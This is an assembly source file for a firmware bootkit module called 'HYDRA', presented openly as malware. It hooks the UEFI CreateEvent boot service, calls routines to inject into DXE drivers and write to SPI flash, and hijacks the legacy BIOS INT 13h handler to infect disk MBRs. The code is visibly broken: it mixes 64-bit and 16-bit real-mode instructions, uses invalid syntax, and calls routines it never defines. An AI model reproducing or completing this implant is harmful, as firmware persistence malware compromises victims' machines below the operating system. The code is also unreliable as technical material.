; -----------------------------------------------------------------------------------|
;                                                                                    |
; MODULE 2: PERSISTENCE MECHANISMS - "HYDRA"                                         |
; Multiple, redundant persistence methods that regenerate if removed.                |
;                                                                                    |
; -----------------------------------------------------------------------------------|

; uefi_implant.asm - Persistence at firmware level
[BITS 64]
section .text

global _start
_start:
    ; Check if running in UEFI environment
    mov rax, [0xffffffd0]  ; EFI system table pointer
    test rax, rax
    jz .legacy_bios
    
    ; UEFI PERSISTENCE
    ; 1. Modify Boot Services Table to hook events
    mov rbx, [rax + 0x60]  ; BootServices
    mov rcx, [rbx + 0x238] ; CreateEvent function
    
    ; Install hook that executes before OS loads
    mov [original_create_event], rcx
    mov [rbx + 0x238], qword hook_create_event
    
    ; 2. Inject into DXE driver
    call inject_dxe_driver
    
    ; 3. Write to SPI flash (requires chipset-specific code)
    call flash_spi_implant
    
    jmp .done
    
.legacy_bios:
    ; LEGACY BIOS PERSISTENCE
    ; Modify INT 13h (disk services) handler
    cli
    xor ax, ax
    mov es, ax
    mov di, 0x13 * 4      ; INT 13h vector
    mov ax, word [es:di]
    mov [old_int13_offset], ax
    mov ax, word [es:di+2]
    mov [old_int13_segment], ax
    
    ; Install our handler
    mov word [es:di], int13_handler
    mov word [es:di+2], cs
    sti

.done:
    ret

hook_create_event:
    ; Our malicious event handler
    ; Executes before Windows boot manager
    ; Can modify boot configuration, inject drivers, etc.
    push rbp
    mov rbp, rsp
    
    ; Check if this is the "ready to boot" event
    cmp rdx, 0x80000000
    jne .call_original
    
    ; Inject our driver into boot sequence
    call inject_boot_driver
    
.call_original:
    pop rbp
    jmp [original_create_event]

int13_handler:
    ; BIOS disk interrupt handler
    ; Infects MBR/VBR of all disks
    cmp ah, 0x02  ; Read sector
    je .infect_sector
    cmp ah, 0x03  ; Write sector
    je .infect_sector
    
    jmp far [cs:old_int13_segment:old_int13_offset]

.infect_sector:
    ; Check if this is MBR (cylinder 0, head 0, sector 1)
    cmp ch, 0
    jne .pass_through
    cmp dh, 0
    jne .pass_through
    cmp cl, 1
    jne .pass_through
    
    ; Infect MBR with our bootkit
    pusha
    call install_bootkit
    popa
    
.pass_through:
    jmp far [cs:old_int13_segment:old_int13_offset]

original_create_event dq 0
old_int13_offset dw 0
old_int13_segment dw 0
